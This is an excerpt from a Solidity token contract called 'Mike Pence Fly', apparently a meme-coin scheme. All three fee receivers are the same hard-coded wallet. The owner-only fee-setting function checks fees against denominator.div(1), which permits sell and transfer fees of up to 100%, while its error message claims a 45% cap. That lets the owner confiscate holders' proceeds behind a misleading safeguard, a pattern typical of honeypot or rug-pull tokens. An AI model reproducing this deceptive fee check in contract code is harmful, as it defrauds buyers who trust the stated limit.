...
contract MikePenceFly is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = 'Mike Pence Fly';
    ...
    address internal constant development_receiver = 0x90BDD14210f8192AaD0896E1D3194A108D000196; 
    address internal constant marketing_receiver = 0x90BDD14210f8192AaD0896E1D3194A108D000196;
    address internal constant liquidity_receiver = 0x90BDD14210f8192AaD0896E1D3194A108D000196;
    ...
    function setStructure(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        ...
        sellFee = _sell;
        transferFee = _trans;
        require(totalFee <= denominator.div(1) && sellFee <= denominator.div(1), "totalFee and sellFee cannot be more than 45%");
    }
